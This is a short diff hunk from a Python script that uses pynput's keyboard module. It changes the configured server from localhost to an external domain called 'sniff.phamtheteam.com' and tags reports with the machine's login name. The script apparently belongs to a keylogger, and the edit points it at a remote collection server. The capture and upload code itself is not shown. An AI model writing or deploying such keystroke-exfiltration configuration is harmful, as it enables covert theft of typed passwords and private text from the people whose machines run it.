@@ -11,7 +11,7 @@ from pynput import keyboard
 
 
 # --- CONFIG ---
-SERVER_URL = "http://localhost:3000"
+SERVER_URL = "https://sniff.phamtheteam.com"
 PC_NAME = os.getlogin() 
 # --------------
 
